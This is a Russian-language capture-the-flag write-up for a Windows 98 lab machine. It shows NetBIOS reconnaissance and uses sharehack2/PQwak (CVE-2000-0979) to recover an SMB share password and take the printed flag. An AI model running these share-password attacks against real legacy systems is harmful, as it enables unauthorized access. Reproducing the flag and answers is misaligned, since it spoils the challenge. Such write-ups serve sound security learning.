## Название: Back to 98  
**Описание**: В те давние времена мало кто думал о безопасности сетей, о патчах и о том, какие порты светить наружу...  
Подключитесь к OpenVPN сети по конфигу, IP уязвимой машины (Windows 98) `10.20.30.2`  
Задача: получить флаг с шары FLAG (путь `\\10.20.30.2\FLAG\flag.txt`)

**Флаг**: `rtctf{OxO_w3lC0m3_frOm_anC1ent_sySt3M_;-)}`  
**Решение**:
Погуглив "win98 share exploit", находим CVE-2000-0979 и тулзы sharehack2 и/или PQwak. Также ищется эксплоит https://github.com/Z6543/CVE-2000-0979, но у меня он не заработал.  
https://vulners.com/exploitdb/EDB-ID:20283  
https://packetstormsecurity.com/files/23408/pqwak.zip  
https://archive.org/details/sht-151 - в этом сборнике также можно найти PQwak  

Найдём NetBIOS-имя машинки:
```sh
$ nmblookup -A 10.20.30.2
Looking up status of 10.20.30.2
        1-PC            <00> -         B <ACTIVE> 
        WORKGROUP       <00> - <GROUP> B <ACTIVE> 
        1-PC            <03> -         B <ACTIVE> 
        1-PC            <20> -         B <ACTIVE> 
        WORKGROUP       <1e> - <GROUP> B <ACTIVE> 
        WORKGROUP       <1d> -         B <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 

        MAC Address = 52-55-00-D1-55-01
```
Подберём пароль к шаре `FLAG` при помощи sharehack2 (может подобраться не с первого раза):
```sh
$ wine sharehack2.exe 10.20.30.2 1-PC FLAG
ShareHack v2.0 by Bjoern Stickler
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-> connected
-> netbios negotiation successful
-> Password is: 2JVWBV8E
```
Также можно использовать команды Windows:
```cmd
nbtstat -A 10.20.30.2
net view \\10.20.30.2
```
![](./solve/net_commands.png)
![](./solve/win98_nbtstat.png)

Помимо sharehack2 есть тулза PQwak, делающая то же самое:
![](./solve/pqwak_sharehack.png)

Далее надо каким-то образом зайти на шару. `mount -t cifs`, просмотр в Win10 (даже со включенным SMBv1) не дали результатов, видимо Win98 слишком уж стара для них. Я поставил виртуалку с Windows XP, там всё сработало:
![](./solve/xp_1.png)
![](./solve/xp_2.png)
![](./solve/xp_3.png)
![](./solve/xp_4.png)


